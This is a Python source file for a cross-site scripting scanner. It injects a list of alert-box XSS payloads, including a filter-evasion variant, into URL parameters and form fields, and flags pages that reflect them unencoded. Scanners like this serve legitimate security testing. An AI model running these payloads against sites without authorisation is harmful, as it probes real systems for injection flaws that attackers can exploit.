"""
Generic XSS Scanner
"""
from src.scanners.base import BaseScanner
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

class XSSScanner(BaseScanner):
    def __init__(self, session, logger, verbose=False):
        super().__init__(session, logger, verbose)
        self.payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "\" onmouseover=\"alert('XSS')\"",
            "' onfocus='alert(\"XSS\")'",
            "javascript:alert('XSS')",
            "\"><script>alert('XSS')</script>",
            "'><script>alert('XSS')</script>",
            "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
        ]

    def test_url(self, url, method='GET'):
        self.logger.debug(f"Testing URL for XSS: {url}")
        parsed = urlparse(url)
        params = parse_qs(parsed.query) if parsed.query else {}
        if not params:
            return False

        for param in params:
            for payload in self.payloads:
                injected_url = self._inject_parameter(url, param, payload)
                if not injected_url:
                    continue
                try:
                    response = self.session.get(injected_url, timeout=10)
                    if self._is_xss_vulnerable(response.text, payload):
                        self.logger.warning(f"🎯 XSS found: {url} param={param} payload={payload}")
                        self.vulnerabilities_found.append({
                            "type": "XSS",
                            "url": url,
                            "parameter": param,
                            "payload": payload,
                            "severity": "Medium"
                        })
                        return True
                except Exception as e:
                    self.logger.debug(f"Error testing {param}: {e}")
        return False

    def test_form(self, form):
        self.logger.debug(f"Testing form for XSS: {form['url']}")
        inputs = form.get('inputs', [])
        testable = [i for i in inputs if i.get('name')]
        if not testable:
            return False

        for inp in testable:
            param = inp['name']
            for payload in self.payloads:
                data = self._build_form_data(form, param, payload)
                try:
                    if form['method'].upper() == 'POST':
                        response = self.session.post(form['url'], data=data, timeout=10)
                    else:
                        response = self.session.get(form['url'], params=data, timeout=10)
                    if self._is_xss_vulnerable(response.text, payload):
                        self.logger.warning(f"🎯 XSS found in form {form['url']} param={param} payload={payload}")
                        self.vulnerabilities_found.append({
                            "type": "XSS",
                            "url": form['url'],
                            "parameter": param,
                            "payload": payload,
                            "severity": "Medium"
                        })
                        return True
                except Exception as e:
                    self.logger.debug(f"Error testing form {param}: {e}")
        return False

    def _is_xss_vulnerable(self, response_text, payload):
        # Check if payload is reflected without encoding
        if payload in response_text:
            return True
        # Additional checks (e.g., in script tags, attributes) can be added
        return False